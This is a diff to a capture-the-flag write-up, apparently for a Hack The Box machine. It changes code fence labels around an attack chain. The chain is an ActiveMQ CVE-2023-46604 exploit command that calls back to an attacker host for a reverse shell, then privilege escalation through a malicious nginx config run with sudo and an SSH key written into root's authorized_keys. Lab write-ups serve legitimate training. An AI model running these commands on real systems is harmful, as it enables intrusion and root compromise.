@@ -17,7 +17,7 @@ https://github.com/dcm2406/CVE-Lab
 https://github.com/vulncheck-oss/cve-2023-46604
 
 Initial foothold
-```
+```bash
 ./cve-2023-46604_linux-amd64 -rhost 10.129.230.87 -rport 61616 -lhost 10.10.15.1 -lport 4444
 ```
 ![20251126013917.png](/assets/img/htb-writeups/Pasted image 20251126013917.png)
@@ -27,7 +27,7 @@ Initial foothold
 https://github.com/advisories/GHSA-w7p3-hmmp-qmx6
 
 Create Malicious Nginx Config
-```
+```bash
 cat > /tmp/pwn.conf << 'EOF'
 user root;
 worker_processes 4;
@@ -44,25 +44,20 @@ http {
     }
 }
 EOF
-```
-
+```bash
 Start Nginx with Root Privileges
 ```
 sudo /usr/sbin/nginx -c /tmp/pwn.conf
-```
-
+```bash
 Generate SSH Key Pair
-```
+```bash
 ssh-keygen -t rsa -b 4096 -f /tmp/root_key -N ""
-```
-
+```bash
 Upload Public Key to Root's authorized_keys
 ```
 curl -X PUT http://localhost:1337/root/.ssh/authorized_keys -d "$(cat /tmp/root_key.pub)"
-```
-
+```bash
 SSH as Root
-```
+```bash
 ssh -i /tmp/root_key root@localhost
-```
-
+```bash
